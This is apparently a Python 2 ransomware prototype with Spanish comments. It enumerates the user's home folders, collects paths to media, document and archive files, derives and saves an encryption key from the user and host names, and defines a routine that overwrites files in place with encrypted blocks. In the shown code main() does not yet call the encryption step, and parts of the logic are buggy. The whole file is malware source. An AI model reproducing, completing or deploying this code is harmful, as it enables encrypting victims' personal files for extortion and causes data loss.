#!/usr/bin/env python
#_*_ codign: utf8 _*_

import os
import socket
import random
import hashlib


	# listar el contenido del directorio HOME
home = os.environ['HOME']
carpetas = os.listdir(home)
	# Eliminar las carpetas que empiecen con .
carpetas = [x for x in carpetas if not x.startswith('.')]

extensiones = ['.mp3','.wav','.m4a','.mp4','.avi','.jpg','jpeg','.zip','.rar','.dat','pdf','.txt']

def check_internet():
		# crear el socket (conector)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# tiempo maximo de espera
	s.settimeout(2)

		# verificar la conexion a internet
	try:
		s.connect(('socket.io',80))
		# print('Conectado')
		s.close()
	except:
		exit()


# Creacion de llave simetrica
def get_hash():
		# obtener una cadena de texto aleatoria
	hashcomputer = os.environ['HOME'] + os.environ['USER'] + socket.gethostname() + str(random.randint(0,10000000000000000000000000))
		# convetir la cadena de texto en un hash (sha512 .. 128 caracteres)
	hashcomputer = hashlib.sha512(hashcomputer)
		# hash con formato mas legible
	hashcomputer = hashcomputer.hexdigest()

		# recortar el hash a una longitud de 32 caracteres
	new_key = []

	for k in hashcomputer:
		if len(new_key) == 32:
			hashcomputer = ''.join(new_key) # .join convierte una lista en una cadena de texto
		else:
			new_key.append(k)

	return hashcomputer


# Encriptar y desencriptar
def encrypt_and_decrypt(archivo, crypto, block_size=16):
		# abrimos el acrchivo en modo binario
	with open(archivo, 'r+b') as archivo_enc:
			# dividimos todo el archivo en bloques de 16 bits
		contenido_sincifrar = archivo_enc.read(block_size)
			# recorremos bloque por bloque
		while contenido_sincifrar:
			contenido_cifrado = crypto(contenido_sincifrar)

			if len(contenido_sincifrar) != len(contenido_cifrado):
				raise ValueError('')

				# nos movemos por el archivo bloque a bloque (seek) para ir cifrandolos
			archivo_enc.seek(- len(contenido_sincifrar), 1)
			archivo_enc.write(contenido_cifrado)
			contenido_sincifrar = archivo_enc.read(block_size)


def discover(key):
	lista_archivos = open('lista_archivos', 'w+')

	for carpeta in carpetas:
			# creamos ruta absoluta
		ruta = home+'/'+carpeta

		for extension in extensiones:
			for rutabs, directorio, archivo in os.walk(ruta): # con os.walk construimos un arbol de directorios para explorar cada uno de los archivos
				for file in archivo:
					if file.endswith(extension):
						lista_archivos.write(os.path.join(rutabs, file)+'\n')
	lista_archivos.close()

		# abrimos y listamos el contenido del archivo 
	lista = open('lista_archivos', 'r')
	lista = lista.read().split('\n')
		# eliminamos el elemento nulo (vacio) del archivo
	lista = [l for l in lista if not l == '']

	key_file = open('key_file', 'w+')
	key_file.write(key)
	key_file.close()




def main():
	check_internet()
	hashcomputer = get_hash()
	#print(hashcomputer)
	#print(len(hashcomputer))
	discover(hashcomputer)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()




